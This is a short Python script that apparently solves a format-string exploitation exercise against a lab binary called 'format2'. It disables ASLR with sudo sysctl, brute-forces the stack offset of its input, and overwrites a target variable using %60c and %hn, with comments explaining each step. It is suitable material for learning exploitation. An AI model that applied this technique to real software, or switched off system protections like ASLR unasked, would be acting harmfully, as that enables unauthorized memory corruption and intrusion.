#!/usr/bin/python3

import subprocess
import struct

# It is required to disable ASLR, because otherwise, we don't know where our format string is on the stack.
# We need to know where it is so that we can control the address that we are using %n to write to.
subprocess.run(["sudo","sysctl","kernel.randomize_va_space=0"])

offset = -1

for i in range(1,180):
    output = subprocess.run(["../Binaries/format2"], input=("AAAA %"+str(i)+"$8x").encode("utf8","surrogateescape"), stdout=subprocess.PIPE).stdout.decode("utf8")
    if "41414" in output:
        print(output)
        offset = i
        break
    
print("Found offset =", offset)

# Run the exploit
address = struct.pack("<L", 0x80496e4).decode("utf8", "surrogateescape")
# In the binary, we found that we wanted to do the overwrite 0x40 (64) to "target". To do that, we have to write 64 bytes to output before %n. We are already writing
# 4 bytes for the address, since this is ELF32. After that, we can go ahead and write 60 more bytes with %60c, which just writes garbage to the screen that we don't
# care about, plus our %hn which actually does the write. We didn't have to do %hn here, but it's nice in future exercises to do so.
proc = subprocess.run(["../Binaries/format2"],  input=(address + "%60c" +"%" + str(offset) + "$hn").encode("utf8","surrogateescape"), stdout=subprocess.PIPE)
print(proc)

# Reenable ASLR
subprocess.run(["sudo","sysctl","kernel.randomize_va_space=2"])